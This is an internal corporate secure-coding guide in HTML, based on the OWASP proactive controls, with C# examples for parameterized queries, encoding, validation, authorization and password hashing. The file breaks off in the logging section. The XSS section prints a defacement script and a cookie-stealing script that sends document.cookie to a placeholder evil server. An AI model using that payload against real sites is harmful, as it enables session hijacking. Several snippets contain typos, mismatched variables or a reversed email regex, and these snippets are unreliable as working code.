<!doctype html>
<html xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml" xmlns:website="http://ogp.me/ns/website" lang="en-US" itemscope itemtype="http://schema.org/WebPage">

    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="viewport" content="initial-scale=1">

        <base href="">
        <meta charset="utf-8" name="Security Best Practices" content="Golub Security Best Practices" />
        <title>Security Best Practices</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
        <link rel="stylesheet" href="styles/site.css">
        <link href="https://fonts.googleapis.com/css?family=Fjalla+One" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
        <style>
            
        </style>
    </head>
    <body>
        <div class="container">
            <br><br>
            <div class="header">
                <h1><b>Secure Coding Standards</b></h1>
            </div>
            
            <div class="intro">
                <h1><b>SECURITY SKILLS</b> ARE NO LONGER OPTIONAL FOR DEVELOPERS</h1>
                <p>
                    As cybersecurity risks steadily increase, application security has become an absolute necessity.  That means secure coding practices must be part of every developers skill set. 
                    How you write code, and the steps you take to update and monitor it, have a big impact on your applications, your organization, and your ability to do your job well.
                </p>
                <p>There’s a harsh reality web application developers need to face up to; we don’t do security very well. A report from WhiteHat Security last year reported “83% of websites have 
                    had a high, critical or urgent issue”. That is, quite simply, a staggeringly high number and it’s only once you start to delve into to depths of web security that you begin to 
                    understand just how easy it is to inadvertently produce vulnerable code. </p>
                <p>
                    This guide will give you practical and consistent set of standards in addressing secure coding practices.  It's based on the <a href="https://www.owasp.org/index.php/Main_Page" target="_blank">OWASP</a> Top 10 
                    Proactive Controls - widely considered as the Gold Standard for application security - but, translated into a concise, easy-to-ue format.  You'll get a brief overview of each 
                    control, along with coding examples, actionable advice, and further resources to help you create secure software.
                </p>
            </div>
            <br><br>
            <div id="one" class="best-practices-block">
                <div class="bp-header">
                    <div class="id"> 1</div>
                    <h2> Verify for Security Early and Often</h2>
                </div>
                <div class="bp-body">
                    <p>It used to be standard practice for the security team to do security testing near the end of a project and then hand the results over to developers for remediation.
                        But tackling a laundry list of fixes just before the application is scheduled to go to production isn’t acceptable anymore. It also increases the risk of a breach. You
                        need the tools and processes for manual and automated testing during coding.
                    </p>
                    <hr>
                    <h5>GUIDANCE</h5>
                    <ul class="checkItem">
                        <li>Use the OWASP Application Security Verification Standard as a guide to define security requirements and generate test cases</li>
                        <li>Scrum (or meet at the beginning of a development effort) with the security team to ensure testing methods fix any defects</li>
                        <li>Add a security champion to each development team. A security champion is a developer with an interest in security who helps amplify
                            the security message at the team level. Security champions don’t need to be security pros; they just need to act as the security conscience of the team,
                            keeping their eyes and ears open for potential issues. Once the team is aware of these issues, it can then either fix the issues in development or call in your
                            organization’s security experts to provide guidance.</li>
                        <li>Include data protections from the beginning. Include security up front when agreeing upon the definition of “done” for a project</li>
                        <li>Integrate security testing in continuous integration to create fast, automated feedback loops.  Here at Golub Capital we use Checkmarx that automatically provides 
                            scans with each code check-in. If you do not have a license for direct access to Checkmarx, you can see a detailed analysis of your application at the 
                        <a href="https://gcconnection.golubcapital.com/depts/TS/Apps/Pages/security.aspx">Golub Application Security Page</a> on Sharepoint.</li>
                    </ul>
                    <hr>
                    <h5>ADDITIONAL RESOURCES</h5>
                    <ul class="resource">
                        <li><a href="https://gcconnection.golubcapital.com/depts/TS/Apps/Pages/security.aspx" target="_blank">Golub Application Security</a></li>
                        <li><a href="https://www.checkmarx.com/resources/white-papers/" target="_blank">Checkmarx Whitepaper collection</a></li>
                        <li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project" target="_blank">OWASP Application Security Verification Standard</a></li>
                        <li><a href="https://www.owasp.org/index.php/OWASP_Testing_Project" target="_blank">OWASP Testing Project</a></li>
                    </ul>
                </div>
            </div>
            <div id="two" class="best-practices-block">
                <div class="bp-header">
                    <div class="id">2</div>
                    <h2>Parameterize Queries</h2>
                </div>
                <div class="bp-body">
                    <p>Injection flaws, such as SQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the 
                        interpreter into executing unintended commands or accessing unauthorised data. </p>
                    <p>SQL injection is one of the most dangerous application risks, partly because attackers can use ubiquitous open source attack tools to exploit these common vulnerabilities.
                        You can mitigate  this risk using query parameterization. This type of query specifies placeholders for parameters, so the database will always treat them as data, rather
                        than part of a SQL command. You can use prepared statements, and a growing number of frameworks, including Entity Framework, use object relational
                        mappers to abstract communication with a database. 
                    </p>
                    
                    <hr>
                    <h5>GUIDANCE</h5>
                    <ul class="checkItem">
                        <li>All input must be validated against a whitelist of acceptable value ranges (<a href="#four">number 4 below</a>).</li>
                        <li>Parameterize the queries by binding the variables.</li>
                        <li>Be cautious about allowing user input into object queries (OQL/HQL) or other advanced queries supported by the framework.</li>
                        <li>Defend against SQL injection using proper database management system configuration - Principle of Least Privilege.</li>
                    </ul>
                    <hr>
                    <h5>THOUGHTS</h5>
                    <p>Sql Injection, although not as common as Cross-Site-Scripting, poses a significantly higher risk because any compromise here can open up more than just the current user session. 
                        With Sql Injection attacks, hi-jacked data and can be stored at the database level to compromise EVERY user of the system.
                    </p>
                    <p></p>
                    <hr>
                    <h5>EXAMPLES</h5>
                    <p>Here is an example of whitelisting and query parametization in C#:</p>
<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 20px; line-height: 125%"><span style="color: #a7a7a7; font-weight: bold">var</span> customerID = Request.QueryString[<span style="color: #CD5555">&quot;CustomerId&quot;</span>];
<span style="color: #228B22">// whitelist RegEx check</span>
<span style="color: #a7a7a7; font-weight: bold">var</span> positiveIntRegex = <span style="color: #8B008B; font-weight: bold">new</span> Regex(<span style="color: #CD5555">@&quot;^0*[1-9][0-9]*$&quot;</span>); 
<span style="color: #228B22">// if the supplied value is not in the whitelist, reject the query immediately</span>
<span style="color: #8B008B; font-weight: bold">if</span>(!positiveIntRegex.IsMatch(customerID)) 
{   
    log.warning(<span style="color: #CD5555">&quot;An invalid CustomerID has been specified.&quot;</span>);   
    <span style="color: #8B008B; font-weight: bold">return</span>; 
}
<span style="color: #a7a7a7; font-weight: bold">string</span> sql = <span style="color: #CD5555">&quot;SELECT * FROM Customers WHERE CustomerId = @CustomerId&quot;</span>;
SqlCommand command = <span style="color: #8B008B; font-weight: bold">new</span> SqlCommand(sql);
command.Parameters.Add(<span style="color: #8B008B; font-weight: bold">new</span> SqlParameter(<span style="color: #CD5555">&quot;@CustomerId&quot;</span>, System.Data.SqlDbType.Int));
command.Parameters[<span style="color: #CD5555">&quot;@CustomerId&quot;</span>].Value = customerID;
</pre></div>
                    <br>
                    <p>Here is an example of whitelisting and query parameterization in C# with the Entity Framework:</p>
<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 20px; line-height: 125%"><span style="color: #a7a7a7; font-weight: bold">var</span> firstname = Request.QueryString[<span style="color: #CD5555">&quot;firstname&quot;</span>];
<span style="color: #a7a7a7; font-weight: bold">var</span> customerID = Request.QueryString[<span style="color: #CD5555">&quot;id&quot;</span>];
<span style="color: #228B22">// whitelist RegEx check</span>
<span style="color: #a7a7a7; font-weight: bold">var</span> positiveIntRegex = <span style="color: #8B008B; font-weight: bold">new</span> Regex(<span style="color: #CD5555">@&quot;^0*[1-9][0-9]*$&quot;</span>); 
<span style="color: #a7a7a7; font-weight: bold">var</span> properNameRegex = <span style="color: #8B008B; font-weight: bold">new</span> Regex(<span style="color: #CD5555">@&quot;^([a-zA-Z]{2,}\s[a-zA-z]{1,}&#39;?-?[a-zA-Z]{2,}\s?([a-zA-Z]{1,})?)&quot;</span>);

<span style="color: #228B22">// if the supplied values are not in the whitelist, reject the query immediately</span>
<span style="color: #8B008B; font-weight: bold">if</span>(!positiveIntRegex.IsMatch(id) || !properNameRegex.IsMatch(firstname))
{   
    log.warning(<span style="color: #CD5555">&quot;An invalid id or firstname has been specified.&quot;</span>);   
    <span style="color: #8B008B; font-weight: bold">return</span>; 
}

<span style="color: #a7a7a7; font-weight: bold">var</span> sql = <span style="color: #CD5555">@&quot;Update [User] SET FirstName = @FirstName WHERE Id = @Id&quot;</span>;
ctx.Database.ExecuteSqlCommand(
    sql,
    <span style="color: #8B008B; font-weight: bold">new</span> <span style="color: #008b45">SqlParameter</span>(<span style="color: #CD5555">&quot;@FirstName&quot;</span>, firstname),
    <span style="color: #8B008B; font-weight: bold">new</span> <span style="color: #008b45">SqlParameter</span>(<span style="color: #CD5555">&quot;@Id&quot;</span>, id));
</pre></div>
    
    
                                                                           
                    <hr>
                    <h5>ADDITIONAL RESOURCES</h5>
                    <ul class="resource">
                        <li><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet" target="_blank">OWASP Query Parameterization Cheat Sheet</a></li>
                        <li><a href="https://www.veracode.com/blog/intro-appsec/sql-injection-attacks-and-how-prevent-them-infographic" target="_blank">SQL Injection Attacks and How to Prevent Them Infographic</a></li>
                    </ul>
                </div>
            </div>
            <div id="three" class="best-practices-block">
                <div class="bp-header">
                    <div class="id"> 3</div>
                    <h2>Encode Data</h2>
                </div>
                <div class="bp-body">
                    <p>XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation and escaping. XSS allows attackers to execute scripts in the victim’s 
                        browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.</p>
                    <p>Encoding translates potentially dangerous special characters into an equivalent form that renders the threat ineffective. This technique is applicable for a
                        variety of platforms and injection methods, including UNIX command encoding, Windows command encoding, and cross-site scripting (XSS). Encoding
                        addresses the three main classes of XSS: persistent, reflected, and DOM-based
                    </p>
                    <hr>
                    <h5>GUIDANCE</h5>
                    <ul class="checkItem">
                        <li><b>Treat all data as untrusted</b>, including dynamic content consisting of a mix of static, developer-built HTML/JavaScript, and data that was originally
                            populated with user input</li>
                        <li>Always use request validation, unless there is an approved reason to have it turned off.  Unless explicitly turned off, all ASP.NET web apps will look for potentially malicious input and throw an HTTP 500 error if detected.</li>
                        <li>Develop relevant encoding (whitelisting inputs) to address the spectrum of attack methods, including injection attacks. In .NET the HtmlEncode functionality and the AntiXSS libraries are a great starting point. See <a href="#four">number 4 below</a>.</li>
                        <li>Use output encoding, such as JavaScript hex encoding and HTML entity encoding. </li>
                        <li>Monitor how dynamic webpage development occurs, and consider how JavaScript and HTML populate user input, along with the risks
                            of untrusted sources.</li>
                    </ul>
                    <hr>
                    <h5>THOUGHTS</h5>
                    <p>This category includes some of the most common attacks that can be found in the wild - including Cross-Site-Scripting (XSS).  Cross-site-scripting is where things begin to get 
                        really interesting, starting with the fact that it’s by far and away the most <b>commonly exploited vulnerability</b> out there today. Recently, WhiteHat Security delivered 
                        their Website Security Statistics Report and found a staggering 65% of websites with XSS vulnerabilities, that’s four times as many as the SQL injection vulnerability 
                        we just looked at in number <b>2</b>.</p>
                    <hr>
                    <h5>EXAMPLES - Cross Site Scripting</h5>
                    <p>This is a common example of a common XSS site defacement</p>
<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 20px; line-height: 125%"><span style="color: #8B008B; font-weight: bold">&lt;script&gt;</span><span style="color: #658b00">document</span>.body.innerHTML(<span style="color: #CD5555">&quot;Jerry was here&quot;</span>);<span style="color: #8B008B; font-weight: bold">&lt;/script&gt;</span>
</pre></div>
                    <br>
                    <p>Example XSS session theft</p>
<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 20px; line-height: 125%"><span style="color: #8B008B; font-weight: bold">&lt;script&gt;</span>
<span style="color: #8B008B; font-weight: bold">var</span> img = <span style="color: #8B008B; font-weight: bold">new</span> Image();
img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&quot;</span> + <span style="color: #658b00">document</span>.cookie;
<span style="color: #8B008B; font-weight: bold">&lt;/script&gt;</span>
</pre></div>
                    <br>
                    <p>The good news is that despite how common these attacks are, they are relativly easy to defend against.  Most languages provide a built-in mechansim to support html encoding for inputs - and they should <b>ALWAYS</b> be used. 
                    In addition, by default, MVC rejects requests containing HTML markup to prevent Cross-Site Scripting attacks and this is one advantage of MVC since if you forgot to work on XSS preventions then you still win; however, do NOT 
                    rely on this as your sole means of protection.</p>
                    <br>
<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 20px; line-height: 125%"><span style="color: #228B22">// input encoding sample</span>
<span style="color: #a7a7a7; font-weight: bold">var</span> newUrl = Request.QueryString[<span style="color: #CD5555">&quot;Url&quot;</span>]; 
<span style="color: #8B008B; font-weight: bold">if</span> (!Uri.IsWellFormedUriString(newUrl, UriKind.Absolute)) 
{
    log.warning(<span style="color: #CD5555">&quot;An invalid URL has been specified.&quot;</span>);   
    <span style="color: #8B008B; font-weight: bold">return</span>;
}
...

<span style="color: #228B22">// output encoding sample</span>
<span style="color: #a7a7a7; font-weight: bold">var</span> name = AntiXss.JavaScriptEncode(txtName.Text, <span style="color: #8B008B; font-weight: bold">false</span>); 
<span style="color: #a7a7a7; font-weight: bold">var</span> message = <span style="color: #CD5555">&quot;Thank you &quot;</span> + name; 
<span style="color: #a7a7a7; font-weight: bold">var</span> alertScript = <span style="color: #CD5555">&quot;&lt;script&gt;alert(&#39;&quot;</span> + message + <span style="color: #CD5555">&quot;&#39;);&lt;/script&gt;&quot;</span>; 
ClientScript.RegisterClientScriptBlock(GetType(), <span style="color: #CD5555">&quot;ThankYou&quot;</span>, alertScript); 
</pre></div>
    


                    <hr>
                    <h5>ADDITIONAL RESOURCES</h5>
                    <ul class="resource">
                        <li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank">OWASP XSS Filter Evasion Cheat Sheet</a></li>
                        <li><a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet" target="_blank">OWASP DOM based XSS Prevention Cheat Sheet</a></li>
                        <li><a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.httpserverutility.htmlencode?view=netframework-4.7.2" target="_blank">HTMLEncode for.NET framework</a></li>
                        <li><a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.security.antixss.antixssencoder?view=netframework-4.7.2" target="_blank">Microsoft AntiXss Library</a></li>
                    </ul>
                </div>
            </div>
            <div id="four" class="best-practices-block">
                <div class="bp-header">
                    <div class="id">4</div>
                    <h2>Validate ALL Inputs</h2>
                </div>
                <div class="bp-body">
                    <p>It's vitally important to ensure that all data is syntactically and semantically valid as it arrives and enters a system. As you approach any task, assume that
                        all data and variables can’t be trusted, and provide security controls regardless of the source of that data. Valid syntax means that the data is in the form that's
                        expected — including the correct number of characters or digits. Semantic validity means that the data has actual meaning and is valid for the interaction
                        or transaction. Whitelisting is the recommended validation method. 
                    </p>
                    <hr>
                    <h5>GUIDANCE</h5>
                    <ul class="checkItem">
                        <li>Assume that all incoming data is untrusted - every input field should be validated before being used, ideally short-circuiting any function logic as a first step.</li>
                        <li>Develop whitelists for checking syntax. For example, regular expressions are a great way to implement whitelist validation, as they offer a way to
                            check whether data matches a specific pattern. </li>
                        <li>Make sure input validation takes place exclusively on the server side. This extends across multiple components, including HTTP headers,
                            cookies, GET and POST parameters (including hidden fields), and file uploads. It also encompasses user devices and back-end web services.</li>
                        <li>Use client-side controls only as a convenience or for notifying users. It should never be relied upon as a hijacker could easily bypass browser or client based security 
                            and send their own input to the server.
                        </li>
                    </ul>
                    <hr>
                    <h5>THOUGHTS</h5>
                    <p>You'll notice that this item, Input Validation, also appears as parts of the other standards for security.  This is an example of Defense-In-Depth.  No single 
                        method provides 100% safety; however, combined, they can lower the risk significantly.
                    </p>
                    <hr>
                    <h5>EXAMPLES - Validating Common Types</h5>
                    <p>Here are some basic validations based on Regular Expressions that you could use:</p>
<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 20px; line-height: 125%"><span style="color: #a7a7a7; font-weight: bold">var</span> firstname = Request.QueryString[<span style="color: #CD5555">&quot;firstname&quot;</span>];

<span style="color: #a7a7a7; font-weight: bold">var</span> positiveRealNumberGreaterThanZeroRegex = <span style="color: #8B008B; font-weight: bold">new</span> Regex(<span style="color: #CD5555">@&quot;^[0-9]*[1-9]+[0-9]*\.[0-9]*$)|(^[0-9]*\.[0-9]*[1-9]+[0-9]*$)|(^[0-9]*[1-9]+[0-9]*$)&quot;</span>); 
<span style="color: #a7a7a7; font-weight: bold">var</span> properNameRegex = <span style="color: #8B008B; font-weight: bold">new</span> Regex(<span style="color: #CD5555">@&quot;^([a-zA-Z]{2,}\s[a-zA-z]{1,}&#39;?-?[a-zA-Z]{2,}\s?([a-zA-Z]{1,})?)&quot;</span>);
<span style="color: #a7a7a7; font-weight: bold">var</span> zipcodeRegex = <span style="color: #8B008B; font-weight: bold">new</span> Regex(<span style="color: #CD5555">@&quot;[0-9]\{5\}(-[0-9]\{4\})?&quot;</span>);
<span style="color: #a7a7a7; font-weight: bold">var</span> emailRegex = <span style="color: #8B008B; font-weight: bold">new</span> Regex(<span style="color: #CD5555">@&quot;/^([a-z0-9_\.-]+)@([\da-z\.-]+)\.([a-z\.]{2,6})$&quot;</span>);
<span style="color: #a7a7a7; font-weight: bold">var</span> golubEmailRegex = <span style="color: #8B008B; font-weight: bold">new</span> Regex(<span style="color: #CD5555">@&quot;/^([\w-\.]+@(?!golubcapital.com)([\w- ]+\.)+[\w-]{2,4})?$/&quot;</span>);

<span style="color: #228B22">// if the supplied values are not in the whitelist, reject the query immediately</span>
<span style="color: #8B008B; font-weight: bold">if</span>(!golubEmailRegex.IsMatch(email))
{   
    log.warning(<span style="color: #CD5555">&quot;An invalid or non-golub email has been specified.&quot;</span>);   
    <span style="color: #8B008B; font-weight: bold">return</span>; 
}
</pre></div>
    
                    <br>
                    <hr>
                    <h5>ADDITIONAL RESOURCES</h5>
                    <ul class="resource">
                        <li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project" target="_blank">OWASP Application Security Verification Standard Project</a></li>
                        <li><a href="https://www.owasp.org/index.php/OWASP_Testing_Project" target="_blank">OWASP Testing Guide</a></li>
                        <li><a href="http://regexlib.com/?AspxAutoDetectCookieSupport=1" target="_blank">Regular Expression Library</a></li>
                    </ul>
                </div>
            </div>
            <div id="five" class="best-practices-block">
                <div class="bp-header">
                    <div class="id">5</div>
                    <h2>Implement Identify and Authentication Controls</h2>
                </div>
                <div class="bp-body">
                    <p>You can avoid security breaches by confirming user identity up front and building strong authentication controls into code and systems. These controls
                        must extend beyond a basic username and password. You’ll want to include both session management and identity management controls to provide the highest
                        level of protection.  
                    </p>
                    <hr>
                    <h5>GUIDANCE</h5>
                    <ul class="checkItem">
                        <li>Use strong authentication methods, including multi-factor authentication,  such as FIDO, dedicated apps, or Windows Authentication.</li>
                        <li>Implement secure password requirements and storage - never store passwords in plain text, even if the database is encrypted. <i>Not really applicable when using Windows Auth.</i></li>
                        <li>Implement a secure password recovery mechanism to help users gain access to their account if they forget their password.  Enable password recovery via resets - never email it. Doing 
                            password recovery wrong is a recipe for disaster; it could literally serve up credentials to an attacker on a silver platter. <i>Not really applicable when using Windows Auth.</i></li>
                        <li>Ensure that all back-end services support only authenticated requests.</li>
                        <li>Establish explicit timeout and inactivity periods for every session.</li>
                        <li>Use re-authentication for sensitive or highly secure features.</li>
                        <li>Use only secure sesion management.</li>
                        <li>Use monitoring and analytics to spot suspicious IP addresses and machine IDs.</li>
                        <li>Consider biometric authentication methods, such as fingerprint, facial recognition, and voice recognition, to verify the identity of users.<sup>*</sup> </li>
                    </ul>
                    <hr>
                    <h5>THOUGHTS</h5>
                    <p>Your users are entering their password into your website or application. They are trusting you with their security. If your database gets hacked, and your users' 
                        passwords are unprotected, then malicious hackers can use those passwords to compromise your users' accounts on other websites and services (most 
                        people use the same password everywhere). It's not just your security that's at risk, it's your users'. You are responsible for your users' security.</p>
                    <hr>
                    <h5>ADDITIONAL RESOURCES</h5>
                    <ul class="resource">
                        <li><a href="https://www.owasp.org/index.php/Authentication_Cheat_Sheet" target="_blank">OWASP Authentication Cheat Sheet</a></li>
                        <li><a href="https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet" target="_blank">OWASP Password Storage Cheat Sheet</a></li>
                        <li><a href="https://www.owasp.org/index.php/Session_Management_Cheat_Sheet" target="_blank">OWASP Session Management Cheat Sheet</a></li>
                    </ul>
                </div>
            </div>
            <div id="six" class="best-practices-block">
                <div class="bp-header">
                    <div class="id">6</div>
                    <h2>Implement Access Controls</h2>
                </div>
                <div class="bp-body">
                    <p>You can dramatically improve protection and resiliency in your applications by building authorization or access controls into your applications in the initial
                        stages of application development. Note that authorization is not the same as authentication. According to OWASP, authorization is the “process where
                        requests to access a particular feature or resource should be granted or denied.”  When appropriate, authorization should include a multi-tenancy and horizontal
                        (data specific) access control. 
                    </p>
                    <hr>
                    <h5>GUIDANCE</h5>
                    <ul class="checkItem">
                        <li>Use a security-centric design, where access is verified first. Consider using a filter or other automated mechanism to ensure that all requests go through
                            an access control check. This can be done either at the server level, directly in method code, or via a Decorator/Attribute attached at the method or class levels.</li>
                        <li>Consider denying all access for features that haven’t been configured for access control.</li>
                        <li>Code to the principle of least privilege. Allocate the minimum privilege and time span required to perform an action for each user or system component.</li>
                        <li>Separate access control policy and application code, whenever possible.</li>
                        <li>Adopt a framework that supports server-side trusted data for driving access control. Key elements of the framework include user identity and log-in
                            state, user entitlements, overall access control policy, the feature and data requested, along with time and geolocation.</li>
                    </ul>
                    <hr>
                    <h5>THOUGHTS</h5>
                    <p>Here, my recommendation diverges from the OWASP standard.  In the OWASP standard, they recommend preferring access checks be done at the individual rather than the role of AD group level.  
                        In theory, they are correct; however, in practice, this approach becomes extremely unwieldy very quickly and requires complex and nearly real-time updates to code or your Authentication 
                        provider to support this behavior.  
                    </p>
                    <hr>
                    <h5>EXAMPLES - Coding to Activity</h5>
                    <p>Here are some examples using the [Authorize] attribute in C# with WebAPI.</p>
<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 20px; line-height: 125%"><span style="color: #8B008B; font-weight: bold">public</span> <span style="color: #8B008B; font-weight: bold">static</span> <span style="color: #8B008B; font-weight: bold">void</span> <span style="color: #008b45">Register</span>(HttpConfiguration config)
{
    config.Filters.Add(<span style="color: #8B008B; font-weight: bold">new</span> AuthorizeAttribute());
}

<span style="color: #228B22">// Require authorization for all actions on the controller.</span>
<span style="color: #658b00">[Authorize]</span>
<span style="color: #8B008B; font-weight: bold">public</span> <span style="color: #8B008B; font-weight: bold">class</span> <span style="color: #008b45; font-weight: bold">ValuesController</span> : ApiController
{
    <span style="color: #8B008B; font-weight: bold">public</span> HttpResponseMessage <span style="color: #008b45">Get</span>(<span style="color: #a7a7a7; font-weight: bold">int</span> id) { ... }
    <span style="color: #8B008B; font-weight: bold">public</span> HttpResponseMessage <span style="color: #008b45">Post</span>() { ... }
}

<span style="color: #228B22">// authorizing only a specific action</span>
<span style="color: #8B008B; font-weight: bold">public</span> <span style="color: #8B008B; font-weight: bold">class</span> <span style="color: #008b45; font-weight: bold">ValuesController</span> : ApiController
{
    <span style="color: #8B008B; font-weight: bold">public</span> HttpResponseMessage <span style="color: #008b45">Get</span>() { ... }

    <span style="color: #228B22">// Require authorization for a specific action.</span>
<span style="color: #658b00">    [Authorize]</span>
    <span style="color: #8B008B; font-weight: bold">public</span> HttpResponseMessage <span style="color: #008b45">Post</span>() { ... }
}

<span style="color: #228B22">// Restrict by user:</span>
<span style="color: #658b00">[Authorize(Users=&quot;Alice,Bob&quot;)]</span>
<span style="color: #8B008B; font-weight: bold">public</span> <span style="color: #8B008B; font-weight: bold">class</span> <span style="color: #008b45; font-weight: bold">ValuesController</span> : ApiController
{
}
   
<span style="color: #228B22">// Restrict by role:</span>
<span style="color: #658b00">[Authorize(Roles=&quot;Administrators&quot;)]</span>
<span style="color: #8B008B; font-weight: bold">public</span> <span style="color: #8B008B; font-weight: bold">class</span> <span style="color: #008b45; font-weight: bold">ValuesController</span> : ApiController
{
}
</pre></div>
                    <br>
                    <hr>
                    <h5>ADDITIONAL RESOURCES</h5>
                    <ul>
                        <li><a href="https://www.owasp.org/index.php/Access_Control_Cheat_Sheet" target="_blank">OWASP Access Control Cheat Sheet</a></li>
                        <li><a href="https://www.owasp.org/index.php/Testing_for_Authorization" target="_blank">OWASP Testing Guide for Authorization</a></li>
                        <li><a href="https://www.veracode.com/security/spoofing-attack" target="_blank">Veracode Guide to Spoofing Attacks</a></li>
                    </ul>
                </div>
            </div>
            <div id="seven" class="best-practices-block">
                <div class="bp-header">
                    <div class="id">7</div>
                    <h2>Protect Data</h2>
                </div>
                <div class="bp-body">
                    <p>Organizations have a duty to protect sensitive data within applications. To that end, you must encrypt critical data while it’s at rest and in transit. This includes
                        financial transactions, web data, browser data, and information residing in mobile apps. Regulations like the EU General Data Protection Regulation make
                        data protection a serious compliance issue. 
                    </p>
                    <hr>
                    <h5>GUIDANCE</h5>
                    <ul class="checkItem">
                        <li>Don’t implement your own homegrown libraries. Use security-focused, peer-reviewed, and open source libraries, including
                            the Google KeyCzar project, Bouncy Castle, and the functions included in SDKs. Most modern languages have implemented crypto-libraries and
                            modules, so choose one based on your application’s language and <b>use it consistently</b>. </li>
                        <li>Never store the key along with the encrypted data.</li>
                        <li>Don’t neglect the more difficult aspects of applied crypto, such as key management, overall cryptographic architecture design, tiering, and trust
                            issues in complex software. Existing crypto hardware, such as a Hardware Security Module (HSM), can make your job easier. </li>
                        <li>Don’t make confidential or sensitive data accessible in memory, or allow it to be written into temporary storage locations or log files that an attacker can view.</li>
                        <li>Only use transport layer security (TLS) to encrypt data in transit. </li>
                    </ul>
                    <hr>
                    <h5>EXAMPLES - Cryptographically Secure Password Hashing</h5>
                    <p>This is an example of cryptographically secure password hashing in C#.Net.</p>
<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 20px; line-height: 125%"><span style="color: #228B22">// generate the SALT</span>
<span style="color: #a7a7a7; font-weight: bold">byte</span>[] salt;
<span style="color: #8B008B; font-weight: bold">new</span> <span style="color: #008b45">RNGCryptoServiceProvider</span>().GetBytes(salt = <span style="color: #8B008B; font-weight: bold">new</span> <span style="color: #a7a7a7; font-weight: bold">byte</span>[<span style="color: #B452CD">16</span>]);

<span style="color: #228B22">// hash and salt it using PBKDF2 - a slow algorithm</span>
<span style="color: #a7a7a7; font-weight: bold">var</span> pbkdf2 = <span style="color: #8B008B; font-weight: bold">new</span> Rfc2898DerviceBytes(password, salt, <span style="color: #B452CD">10000</span>);

<span style="color: #228B22">// place the string in the byte array</span>
<span style="color: #a7a7a7; font-weight: bold">byte</span>[] hash = pbkdf2.GetBytes(<span style="color: #B452CD">20</span>);

<span style="color: #228B22">// make a new byte array to store the hashed password + salt</span>
<span style="color: #a7a7a7; font-weight: bold">byte</span>[] hashBytes = <span style="color: #8B008B; font-weight: bold">new</span> <span style="color: #a7a7a7; font-weight: bold">byte</span>[<span style="color: #B452CD">36</span>];

<span style="color: #228B22">// place the hash and salt in their respective places</span>
Array.Copy(salt, <span style="color: #B452CD">0</span>, hashBytes, <span style="color: #B452CD">0</span>, <span style="color: #B452CD">16</span>);
Array.Copy(hash, <span style="color: #B452CD">0</span>, hashBytes, <span style="color: #B452CD">16</span>, <span style="color: #B452CD">20</span>);

<span style="color: #228B22">// now convert into a string for eventual storage</span>
<span style="color: #a7a7a7; font-weight: bold">string</span> savedPasswordHash = Convert.ToBase64String(hashBytes);
</pre></div>
                    <br>
                    <hr>
                    <h5>ADDITIONAL RESOURCES</h5>
                    <ul class="resource">
                        <li><a href="https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet" target="_blank">OWASP Password Storage Cheat Sheet</a></li>
                        <li><a href="https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet" target="_blank">OWASP Cryptographic Storage Cheat Sheet</a></li>
                        <li><a href="https://www.veracode.com/blog/research/cryptographically-secure-pseudo-random-number-generator-csprng" target="_blank">Cryptographically Secure Pseudo-Random Number Generators</a></li>
                        <li><a href="https://www.veracode.com/blog/research/encryption-and-decryption-java-cryptography" target="_blank">Encryption and Decryption in Java Cryptography</a></li>
                    </ul>
                </div>
            </div>
            <div id="eight" class="best-practices-block">
                <div class="bp-header">
                    <div class="id">8</div>
                    <h2>Implement Logging and Intrustion Detection</h2>
                </div>
                <div class="bp-body">
                    <p>Logging should be used for more than just debugging and troubleshooting.  Logging and tracking security events and metrics helps to enable what’s
                        known as attack-driven defense, which considers the scenarios for real-world attacks against your system. For example, if a server-side
                        validation catches a change to a non-editable, throw an alert or take some other action to protect your system. Focus on four key areas: application
                        monitoring; business analytics and insight; activity auditing and compliance monitoring; and system intrusion detection and forensics.
                    </p>
                    <hr>
                    <h5>GUIDANCE</h5>
                    <ul class="checkItem">
                        <li>Use an extensible logging framework like Serilog, or Apache Log4j2 / Log4net, to ensure that all log entries are consistent.</li>
                        <li>Keep various audit and transaction logs separate for both security and auditing purposes.</li>
                        <li>Always log the timestamp and identifying information, like source IP and user ID.</li>
                        <li>Log all instances where inappropriate inputs are provided.</li>
